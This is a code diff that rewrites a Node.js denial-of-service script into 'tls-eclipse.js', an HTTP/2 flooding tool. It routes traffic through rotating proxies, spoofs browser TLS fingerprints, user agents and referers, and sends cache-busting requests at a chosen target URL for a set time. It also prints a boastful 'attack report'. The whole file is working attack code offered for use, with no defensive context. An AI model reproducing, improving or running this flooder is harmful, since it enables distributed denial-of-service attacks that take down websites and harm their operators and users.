@@ -1,78 +1,167 @@
-const fs = require('fs');
 const { exec } = require('child_process');
+require('events').EventEmitter.defaultMaxListeners = 0;
+process.setMaxListeners(0);
 
-if (process.argv.length < 4) {
-    console.log('Usage: node attack.js <url> <time_in_seconds>');
-    process.exit(1);
+const fs = require('fs');
+const url = require('url');
+const http = require('http');
+const tls = require('tls');
+const crypto = require('crypto');
+const http2 = require('http2');
+tls.DEFAULT_ECDH_CURVE;
+
+let proxies, UAs, referers;
+try {
+  proxies = fs.readFileSync("proxy.txt", 'utf-8').replace(/\r/g, '').split('\n');
+} catch {
+  console.log('Proxy file not found: proxy.txt');
+  process.exit();
+}
+
+try {
+  UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
+} catch {
+  console.log('User-agent file not found: ua.txt');
+  process.exit();
+}
+
+try {
+  referers = fs.readFileSync('refs.txt', 'utf-8').replace(/\r/g, '').split('\n');
+} catch {
+  referers = ['https://google.com', 'https://bing.com'];
 }
 
 const target = process.argv[2];
 const duration = parseInt(process.argv[3]) * 1000;
-const endTime = Date.now() + duration;
 
-const proxies = fs.readFileSync('proxies.txt', 'utf8')
-    .split('\n')
-    .map(p => p.trim())
-    .filter(Boolean);
-
-if (proxies.length === 0) {
-    console.log('No proxies found in proxies.txt');
-    process.exit(1);
+if (!target || !duration) {
+  console.log('Usage: node tls-eclipse.js <target> <duration_in_seconds>');
+  process.exit();
 }
 
-let success = 0;
-let fail = 0;
-let totalSent = 0;
-const usedProxies = new Set();
+const parsed = url.parse(target);
 
-function getRandomProxy() {
-    return proxies[Math.floor(Math.random() * proxies.length)];
-}
+const sigalgs = [
+  'ecdsa_secp256r1_sha256',
+  'ecdsa_secp384r1_sha384',
+  'ecdsa_secp521r1_sha512',
+  'rsa_pss_rsae_sha256',
+  'rsa_pss_rsae_sha384',
+  'rsa_pss_rsae_sha512',
+  'rsa_pkcs1_sha256',
+  'rsa_pkcs1_sha384',
+  'rsa_pkcs1_sha512',
+];
+const SignalsList = sigalgs.join(':');
 
-function sendRequestCurl(proxy) {
-    const cmd = `curl --proxy http://${proxy} --max-time 60 -s -o /dev/null -w "%{http_code}" "${target}"`;
+class TlsBuilder {
+  constructor(socket) {
+    this.curve = "GREASE:X25519:x25519";
+    this.sigalgs = SignalsList;
+    this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION |
+      crypto.constants.SSL_OP_NO_TICKET |
+      crypto.constants.SSL_OP_NO_SSLv2 |
+      crypto.constants.SSL_OP_NO_SSLv3 |
+      crypto.constants.SSL_OP_NO_COMPRESSION |
+      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+      crypto.constants.SSL_OP_TLSEXT_PADDING |
+      crypto.constants.SSL_OP_ALL;
+  }
 
-    exec(cmd, (err, stdout, stderr) => {
-        totalSent++;
-        usedProxies.add(proxy);
+  http2TUNNEL(socket) {
+    socket.setKeepAlive(true, 1000);
+    socket.setTimeout(10000);
+    const headers = {
+      ":method": "GET",
+      ":path": parsed.path,
+      "User-agent": UAs[Math.floor(Math.random() * UAs.length)],
+      "Referer": referers[Math.floor(Math.random() * referers.length)],
+      "Cache-Control": 'no-cache, no-store,private, max-age=0, must-revalidate',
+      "Pragma": 'no-cache, no-store,private, max-age=0, must-revalidate',
+      "client-control": 'max-age=43200, s-max-age=43200',
+      "Upgrade-Insecure-Requests": "1",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Accept-Language": "en-US,en;q=0.9"
+    };
 
-        if (stdout.trim().startsWith('2')) {
-            success++;
-        } else {
-            fail++;
-        }
+    const tunnel = http2.connect(parsed.href, {
+      createConnection: () =>
+        tls.connect({
+          socket: socket,
+          ciphers: tls.getCiphers().join(':') + ':TLS_AES_128_GCM_SHA256',
+          host: parsed.host,
+          servername: parsed.host,
+          secure: true,
+          honorCipherOrder: true,
+          requestCert: true,
+          secureOptions: this.Opt,
+          sigalgs: this.sigalgs,
+          rejectUnauthorized: false,
+          ALPNProtocols: ['h2']
+        })
     });
+
+    tunnel.on('connect', () => {
+      for (let i = 0; i < 16; i++) {
+        setImmediate(() => {
+          const req = tunnel.request(headers);
+          req.on('error', () => {});
+          req.close();
+        });
+      }
+    });
+
+    tunnel.on('error', () => {});
+  }
 }
 
-async function startAttack() {
-    const interval = setInterval(() => {
-        if (Date.now() > endTime) {
-            clearInterval(interval);
+const keepAliveAgent = new http.Agent({
+  keepAlive: true,
+  maxSockets: Infinity,
+  maxTotalSockets: Infinity,
+});
 
-            setTimeout(() => {
-                console.log('\n=== GANG STRIKE REPORT ===');
-                console.log(`Target: ${target}`);
-                console.log(`Sent: ${totalSent}`);
-                console.log(`Success (2xx): ${success}`);
-                console.log(`Fail: ${fail}`);
-                console.log(`Proxies Used: ${usedProxies.size}`);
-                if (usedProxies.size > 0) {
-                    console.log('\nProxy List Used:');
-                    for (let p of usedProxies) {
-                        console.log(' - ' + p);
-                    }
-                } else {
-                    console.log('\n - None used.');
-                }
-                console.log('===========================');
-            }, 5000);
+function Runner() {
+  for (let i = 0; i < 120; i++) {
+    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
+    const req = http.get({
+      host: proxy[0],
+      port: proxy[1],
+      method: 'CONNECT',
+      agent: keepAliveAgent,
+      path: parsed.host + ':443',
+      timeout: 8000
+    });
 
-            return;
-        }
+    req.on('connect', (_, socket) => {
+      const tlsBuild = new TlsBuilder();
+      tlsBuild.http2TUNNEL(socket);
+    });
 
-        const proxy = getRandomProxy();
-        sendRequestCurl(proxy);
-    }, 20); // adjust for how fast you wanna spin
+    req.on('error', () => {});
+    req.end();
+  }
 }
 
-startAttack();
+// ====== ATTACK START REPORT (like C-ECLIPSE) ======
+console.clear();
+console.log(`\n=== TLS-ECLIPSE ATTACK REPORT ===`);
+console.log(`Target     : ${target}`);
+console.log(`Duration   : ${duration / 1000}s`);
+console.log(`Proxies    : ${proxies.length}`);
+console.log(`User-Agents: ${UAs.length}`);
+console.log(`Referers   : ${referers.length}`);
+console.log(`Time       : ${new Date().toLocaleTimeString()}`);
+console.log(`Attack     : Started!\n`);
+
+const spammer = setInterval(Runner, 500);
+
+setTimeout(() => {
+  clearInterval(spammer);
+  console.log('\n[+] Attack Finished, soldier out.');
+  process.exit();
+}, duration);
+
+process.on('uncaughtException', () => {});
+process.on('unhandledRejection', () => {});
